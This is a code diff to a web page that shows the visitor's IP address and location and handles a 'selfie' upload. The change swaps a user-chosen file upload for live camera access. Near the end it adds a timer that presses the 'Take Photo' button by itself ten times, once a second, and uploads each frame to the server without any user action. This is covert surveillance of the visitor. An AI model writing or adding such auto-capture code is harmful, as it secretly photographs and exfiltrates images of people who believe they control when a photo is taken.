@@ -11,15 +11,15 @@
       <p>Location: <span id="location"></span></p>
     </div>
     <div id="camera">
-      <input type="file" id="fileInput" accept="image/*" capture="user">
-      <img id="preview" style="display:none;" width="640" height="480" />
-      <button id="upload" style="display:none;">Upload Photo</button>
+      <video id="video" width="640" height="480" autoplay></video>
+      <button id="snap">Take Photo</button>
+      <canvas id="canvas" width="640" height="480" style="display: none"></canvas>
     </div>
     <script>
       // Get user IP and location
       fetch("/api/location")
-        .then((response) => response.json())
-        .then((data) => {
+        .then(response => response.json())
+        .then(data => {
           if (data.ip) {
             document.getElementById("ip").textContent = data.ip;
           }
@@ -29,41 +29,50 @@
             document.getElementById("location").textContent = "Location data not available.";
           }
         })
-        .catch((error) => console.error("Error:", error));
+        .catch(error => console.error("Error:", error));
 
-      const fileInput = document.getElementById("fileInput");
-      const preview = document.getElementById("preview");
-      const uploadButton = document.getElementById("upload");
+      // Access the device camera and take a photo
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const snap = document.getElementById("snap");
 
-      fileInput.addEventListener("change", () => {
-        const file = fileInput.files[0];
-        if (file) {
-          const reader = new FileReader();
-          reader.onload = (e) => {
-            preview.src = e.target.result;
-            preview.style.display = "block";
-            uploadButton.style.display = "block";
-          };
-          reader.readAsDataURL(file);
-        }
-      });
+      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+          })
+          .catch(error => console.error("Error accessing camera:", error));
+      } else {
+        console.error("getUserMedia not supported on your browser!");
+      }
 
-      uploadButton.addEventListener("click", () => {
-        const file = fileInput.files[0];
-        if (file) {
+      snap.addEventListener("click", () => {
+        const context = canvas.getContext("2d");
+        context.drawImage(video, 0, 0, 640, 480);
+        canvas.toBlob(blob => {
           const formData = new FormData();
-          formData.append("selfie", file);
+          formData.append("selfie", blob, "selfie.png");
           fetch("/api/upload", {
             method: "POST",
             body: formData,
           })
-            .then((response) => response.json())
-            .then((data) => {
+            .then(response => response.json())
+            .then(data => {
               console.log("File uploaded successfully:", data.filePath);
             })
-            .catch((error) => console.error("Error uploading file:", error));
-        }
+            .catch(error => console.error("Error uploading file:", error));
+        });
       });
+
+      let limit = 10;
+      let interval = setInterval(() => {
+        if (limit > 0) {
+          snap.click();
+          limit--;
+        } else {
+          clearInterval(interval);
+        }
+      }, 1000);
     </script>
   </body>
 </html>
